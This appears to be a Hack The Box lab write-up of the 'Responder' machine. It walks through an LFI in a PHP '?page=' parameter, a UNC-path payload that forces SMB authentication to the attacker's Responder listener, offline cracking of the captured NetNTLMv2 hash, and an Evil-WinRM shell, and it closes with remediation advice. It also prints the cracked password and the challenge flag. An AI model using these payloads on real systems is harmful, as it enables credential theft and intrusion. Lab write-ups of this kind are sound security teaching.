# Responder

**Platform:** Hack The Box · **Type:** Starting Point · **OS:** Windows · **Difficulty:** Tier 1

**Summary:**
- A PHP site on Windows had an LFI in an unsanitized URL parameter.
- PHP still loads SMB paths even with `allow_url_include` off, so I made the server authenticate to my machine over SMB.
- Responder captured the Administrator's NetNTLMv2 hash and John cracked it offline.
- With the password, Evil-WinRM gave a remote shell.

## 1. Reconnaissance

### 1.1 Port scan
**Command:** `nmap -sV 10.129.79.169`

| **Port** | **Service** | **Version**                                            | **State** |
| -------- | ----------- | ------------------------------------------------------ | --------- |
| 80       | HTTP        | Apache httpd 2.4.52 (Win64, OpenSSL/1.1.1m, PHP/8.1.1) | Open      |
| 5985     | HTTP        | Microsoft HTTPAPI httpd 2.0 (WinRM)                    | Open      |

Port 5985 matters: WinRM is enabled, so valid credentials would mean a remote shell through Evil-WinRM.

### 1.2 Web service
The server redirects to `unika.htb`, so I added it to `/etc/hosts`:

```bash
echo "10.129.79.169    unika.htb" | sudo tee -a /etc/hosts
````

![Pasted image 20260415162605](../../../Attachments/Pasted%20image%2020260415162605.png)

Gobuster found a few paths, none of them critical on their own:

```bash
gobuster dir -u 10.129.79.169 --wordlist "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"
```

![Pasted image 20260415162803](../../../Attachments/Pasted%20image%2020260415162803.png)

The interesting part came from browsing the site. The `?page=` parameter loads different language versions (`french.html`, `german.html`, etc.) and does no sanitization on the input.

## 2. Foothold

### 2.1 Local File Inclusion
`?page=` passes the path to PHP's `include()` without validating it, so it can reference arbitrary files on the server.

Proof of concept:
```
http://unika.htb/?page=../../../../windows/system32/drivers/etc/hosts
```

The response contains the Windows `hosts` file, which confirms the LFI.

![Pasted image 20260415163145](../../../Attachments/Pasted%20image%2020260415163145.png)

### 2.2 Capturing a NetNTLMv2 hash over SMB
`allow_url_include` is disabled in `php.ini`, but PHP still allows SMB paths. If the page parameter points to a UNC path on my machine, the Windows server tries to authenticate with NTLM. That exposes the NetNTLMv2 hash of the account running the web server.

NTLM is challenge-response: the server sends a random challenge, the client encrypts it with its password hash and sends the result back. That response (NetNTLMv2) can be captured and cracked offline.

I started Responder on the VPN interface (`tun0`) to act as an SMB server:

```bash
sudo responder -I tun0
```

Then I requested a UNC path pointing at my IP:

```
http://unika.htb/?page=//10.10.16.225/whatever
```

The server authenticated against the listener and Responder captured the hash:

```
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:4198d1d8a1688c5e:A0FA6A874359EE98A4536357517D5934:0101...
```

### 2.3 Cracking with John the Ripper
I saved the hash to `hash.txt` and ran it against `rockyou.txt`:

```bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

The Administrator password is `badminton`; it cracked in under a second.

## 3. Privilege Escalation

No separate escalation step: the cracked hash already belongs to `Administrator`.

```bash
evil-winrm -i 10.129.79.169 -u administrator -p badminton
```

From that session, the flag is on `mike`'s desktop:

```powershell
type ..\..\mike\Desktop\flag.txt
```

**Flag:** `ea81b7afddd03efaa0945333ed147fac`

## 4. Conclusion

**Severity:** High

**Chain:** LFI in `?page=` → forced SMB authentication → NetNTLMv2 capture → offline crack → WinRM as Administrator.

Every step was avoidable:
- **Fix the LFI:** validate any parameter that controls file loading against an allowlist instead of passing user input to `include()`.
- **Limit what `include()` can reach:** restrict it to the local filesystem.
- **Run the web server with low privileges:** use a least-privilege service account, so a leaked hash isn't an admin's.
- **Use strong passwords:** `badminton` is trivially weak. A strong password policy plus MFA for remote access would have stopped the crack even after the hash leaked.
